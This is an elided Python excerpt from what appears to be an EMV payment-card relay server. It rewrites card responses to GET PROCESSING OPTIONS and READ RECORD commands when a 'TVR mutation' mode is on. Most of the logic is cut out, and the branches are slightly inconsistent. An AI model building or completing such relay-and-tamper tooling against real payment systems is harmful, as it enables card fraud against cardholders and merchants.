...
class RelayServer:
    ...
    def _handle_rapdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        ...
        if (source_name == "READER" or addr == self.reader_addr) and (payload == b"\x6f\x00" or sw == constants.SW_6F00):
        ...
        if self._router_mutation_active():
            ...
            if self.state.tvr_mutation_enabled and pending_ins in (constants.INS_GET_PROCESSING_OPTIONS, constants.INS_READ_RECORD):
        ...
        if self.state.tvr_mutation_enabled:
            ...
            if pending_ins == constants.INS_GET_PROCESSING_OPTIONS:
                ...
                if not allowed:
                  ...
                  try:
                      original_payload = payload
                      result = mutate_read_record_response(payload, policy=policy)
                      if isinstance(result, tuple):
                          payload, _ok = result
                          if payload != original_payload:
                            log.debug("[READ-RECORD-MUTATE] applied")
                      else:
                        payload = result
                  except Exception as e:
